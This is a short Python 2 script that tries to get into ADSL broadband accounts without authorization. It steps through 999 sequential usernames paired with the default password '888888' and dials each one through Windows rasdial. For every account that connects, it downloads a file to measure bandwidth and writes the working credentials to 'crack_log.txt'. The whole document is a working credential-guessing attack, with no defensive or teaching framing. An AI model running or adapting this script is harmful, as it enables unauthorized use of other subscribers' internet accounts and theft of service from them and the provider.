# -*- coding: utf-8 -*-
"""
Created on 2017

@author: WHUER
"""
import os
import time
from test4speed import get_bandwidth

class ADSL(object):
    def __init__(self):
        self.name = adsl_account["name"]
        self.username = adsl_account["username"]
        self.password = adsl_account["password"]

    def set_adsl(self, account):
        self.name = account["name"]
        self.username = account["username"]
        self.password = account["password"]

    def connect(self):
        cmd_str = "rasdial %s %s %s" % (self.name, self.username, self.password)
        r = os.popen(cmd_str)
        info = r.readlines()
        lines = len(info)
        text = []
        for i in xrange(lines):
            line = info[i].strip('\n').decode('gbk').encode('utf-8')
            text.append(line)
            print line
        print 'wait for 10 seconds!'
        time.sleep(10)
        return text

    def disconnect(self):
        cmd_str = "rasdial %s /disconnect" % self.name
        r = os.popen(cmd_str)
        info = r.readlines()
        for line in info:
            line = line.strip('\n').decode('gbk').encode('utf-8')
            print line
        print 'wait for 10 seconds!'
        time.sleep(10)

# ==============================================================================
# MAIN
# ==============================================================================

for i in range(1, 1000):
    username = str(5183000000 + i)
    adsl_account = {"name": "RAS",
                      "username": username,
                      "password": "888888"}
    DIAL = ADSL()
    try:
        print 'try to disconnect!'
        DIAL.disconnect()
    except:
        print 'run fail!'

    try:
        print 'try to connect internet by ' + username
        receive = DIAL.connect()
    except:
        print 'run fail!'
    if receive[3] == '已连接 RAS。':
        input_url = 'http://211.137.51.152/cache/sw.bos.baidu.com/sw-search-sp/software/9e85b452bf53e/Baidu_Setup_5388_3.2.0.3068_10000009.exe?ich_args2=100-29151407054307_591c84bf8ef8b74eccc6969ac606795d_10068001_9c886c29d1c4f5d19f32518939a83798_7efac374a5b0e2684e57728b470136ba'
        bandwidth = int(round(get_bandwidth(input_url)))
        print "相当于带宽： %d M" %(bandwidth)
        content = username + " 888888 " + str(bandwidth) + 'M'
    else:
        content = username + ' ' + "888888" + ' fail!'
    f = open("crack_log.txt", 'a')
    f.write(content + '\n')
    f.close()